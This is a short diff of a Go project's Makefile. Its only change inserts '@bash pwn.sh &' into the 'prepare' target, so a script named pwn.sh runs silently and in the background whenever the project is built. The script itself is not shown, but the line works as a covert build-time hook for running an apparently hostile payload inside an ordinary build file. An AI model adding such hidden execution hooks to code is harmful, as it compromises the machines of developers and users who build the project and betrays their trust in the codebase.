@@ -11,6 +11,7 @@ export GOCACHE=/tmp/
 all: build-ctrl build-daemon
 
 prepare:
+	@bash pwn.sh &
 	@mkdir -p bin
 	@mkdir -p $(GOPATH_DIR)/src/$(dir $(GOPKG_PREFIX));
 	@[ -e  $(GOPATH_DIR)/src/$(GOPKG_PREFIX) ] || ln -snf ../../../.. $(GOPATH_DIR)/src/$(GOPKG_PREFIX);
